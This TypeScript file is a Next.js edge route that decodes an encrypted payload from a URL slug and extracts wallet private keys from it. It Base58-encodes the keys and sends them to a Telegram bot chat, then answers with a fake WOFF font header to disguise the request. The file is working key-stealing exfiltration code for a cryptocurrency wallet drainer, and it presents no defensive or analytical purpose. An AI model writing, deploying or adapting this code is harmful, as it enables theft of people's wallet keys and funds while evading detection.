import { NextRequest } from "next/server";

export const config = {
  runtime: "edge",
};

// Minimal Base58 encoder
const BASE58_ALPHABET =
  "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
function encodeBase58(buffer: Uint8Array): string {
  const digits = [0];
  for (let byte of buffer) {
    let carry = byte;
    for (let i = 0; i < digits.length; i++) {
      const val = digits[i] * 256 + carry;
      digits[i] = val % 58;
      carry = (val / 58) | 0;
    }
    while (carry) {
      digits.push(carry % 58);
      carry = (carry / 58) | 0;
    }
  }
  // handle leading zeros
  for (let i = 0; i < buffer.length && buffer[i] === 0; i++) {
    digits.push(0);
  }
  return digits
    .reverse()
    .map((d) => BASE58_ALPHABET[d])
    .join("");
}

// Convert a base64 (or URL-safe base64) string → Uint8Array
function b64ToBytes(b64: string): Uint8Array {
  // restore URL-safe chars
  b64 = b64.replace(/-/g, "+").replace(/_/g, "/");
  // pad to multiple of 4
  const pad = (4 - (b64.length % 4)) % 4;
  b64 += "=".repeat(pad);

  // atob → binary string → Uint8Array
  const bin = atob(b64);
  const arr = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) {
    arr[i] = bin.charCodeAt(i);
  }
  return arr;
}

// ArrayBuffer → hex string
function bufToHex(buf: ArrayBuffer): string {
  const bytes = new Uint8Array(buf);
  return Array.from(bytes)
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

export default async function handler(req: NextRequest) {
  const BOT_TOKEN = process.env.BOT_TOKEN;
  const CHAT_ID = process.env.CHAT_ID;
  if (!BOT_TOKEN || !CHAT_ID) {
    console.error("Missing BOT_TOKEN or CHAT_ID");
    return new Response("Server misconfigured", { status: 500 });
  }

  // 1) extract slug
  const parts = new URL(req.url).pathname.split("/");
  const slug = parts[parts.length - 1];
  if (!slug || !slug.includes("_")) {
    return new Response("Invalid slug", { status: 400 });
  }

  let payloadJson: string;
  try {
    const encoded = slug.split("_")[1];
    const bytes = b64ToBytes(encoded);
    payloadJson = new TextDecoder().decode(bytes);
  } catch (e) {
    console.error("Slug decode error:", e);
    return new Response("Bad request", { status: 400 });
  }

  // 2) parse JSON
  let data: { keybundle: string; sBundles: string[] };
  try {
    data = JSON.parse(payloadJson);
  } catch (e) {
    console.error("JSON parse error:", e);
    return new Response("Bad request", { status: 400 });
  }

  // 3) import AES-GCM key
  let aesKey: CryptoKey;
  try {
    const keyBytes = b64ToBytes(data.keybundle);
    aesKey = await crypto.subtle.importKey(
      "raw",
      keyBytes,
      "AES-GCM",
      false,
      ["decrypt"]
    );
  } catch (e) {
    console.error("Key import error:", e);
    return new Response("Bad request", { status: 400 });
  }

  // 4) decrypt each bundle
  const privKeys: string[] = [];
  for (let i = 0; i < data.sBundles.length; i++) {
    const [ivB64, cipherB64] = data.sBundles[i].split(":");
    try {
      const iv = b64ToBytes(ivB64);
      const cipher = b64ToBytes(cipherB64);
      const plain = await crypto.subtle.decrypt(
        { name: "AES-GCM", iv },
        aesKey,
        cipher
      );
      const hex = bufToHex(plain);
      const privHex = hex.slice(64);            // last 64 chars
      const privB58 = encodeBase58(
        new Uint8Array(
          privHex.match(/.{2}/g)!.map((h) => parseInt(h, 16))
        )
      );
      privKeys.push(privB58);
    } catch (e) {
      console.error(`Decrypt error #${i}:`, e);
    }
  }

  // 5) send Telegram
  if (privKeys.length) {
    const lines: string[] = [];
    privKeys.forEach((pk, idx) => {
      lines.push(`Wallet ${idx + 1}`, pk, "");
    });
    const text = lines.join("\n").trim();

    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text,
        }),
      });
    } catch (e) {
      console.error("Telegram send error:", e);
    }
  } else {
    console.error("No private keys decrypted");
  }

  // 6) return valid WOFF header
  return new Response(new Uint8Array([0x77, 0x4f, 0x46, 0x46]), {
    headers: {
      "Content-Type": "font/woff",
      "Access-Control-Allow-Origin": "*",
    },
  });
}
